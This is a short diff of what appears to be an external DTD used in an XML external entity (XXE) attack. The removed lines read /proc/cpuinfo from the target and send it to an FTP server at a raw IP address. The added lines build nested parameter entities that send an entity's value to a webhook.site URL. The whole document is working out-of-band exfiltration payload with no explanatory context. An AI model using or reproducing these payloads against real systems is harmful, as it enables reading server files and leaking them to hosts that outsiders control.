@@ -1,2 +1,4 @@
-<!ENTITY % d SYSTEM "file:///proc/cpuinfo">
-<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://81.56.10.201:2121/%d;'>">
+<!ENTITY file "my entity value" >
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://webhook.site/e08dc5a2-0284-4a62-91c9-9825074eb52c/?x=%file;'>">
+%eval;
+%exfiltrate;
